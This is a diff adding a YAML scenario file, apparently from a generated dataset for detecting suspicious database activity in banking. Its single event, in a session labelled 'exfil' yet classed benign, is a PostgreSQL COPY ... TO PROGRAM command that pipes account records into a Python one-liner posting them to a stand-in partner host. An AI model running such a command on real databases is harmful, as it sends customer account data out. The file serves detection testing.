@@ -1,0 +1,31 @@
+scenario_id: gen_banking_49_copy_to_program_ben_1268b
+family_id: gen_banking_49_copy_to_program_fam_1268
+domain: banking
+time_of_day: 02:35
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: exfil
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT account_id, account_type FROM accounts WHERE branch_id = 'BR-021')
+      TO PROGRAM 'python3 -c "import urllib.request,sys; urllib.request.urlopen(urllib.request.Request(\"https://sync.partner-mirror.example/ingest\",
+      data=sys.stdin.buffer.read(), method=\"POST\"))"'
+    connects_to:
+      ip: 198.51.100.168
+      port: 8080
+matched_pair_id: gen_banking_49_copy_to_program_pair_1268
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
